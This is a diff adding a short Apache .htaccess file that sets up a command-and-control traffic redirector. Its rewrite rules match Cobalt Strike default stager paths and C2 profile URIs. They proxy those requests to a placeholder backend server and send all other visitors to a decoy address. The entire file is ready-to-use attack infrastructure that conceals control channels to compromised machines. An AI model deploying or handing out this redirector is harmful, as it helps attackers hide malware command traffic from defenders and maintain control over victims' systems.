@@ -1,0 +1,7 @@
+# .htaccess File to implement a C2 Traffic Redirector using Mod_Rewrite in Apache2
+
+RewriteCond %{REQUEST_URI} ^\/....\/?$ [NC,OR] # Default Cobalt Stager, 4 Random Chars
+RewriteCond %{REQUEST_URI} ^\/favicon.ico\/.* [NC,OR] # Favicon for C2 Profile traffic (common)
+RewriteCond %{REQUEST_URI} ^\/liveUpdate\/.* [NC] # Live Update for C2 Profile traffic (common)
+RewriteRule ^.*$ https://hostOrIPaddressGoesHere%{REQUEST_URI} [P]
+RewriteRule ^.*$ https://404AddressOrOtherRedirectGoesHere/404? [L,R=302]
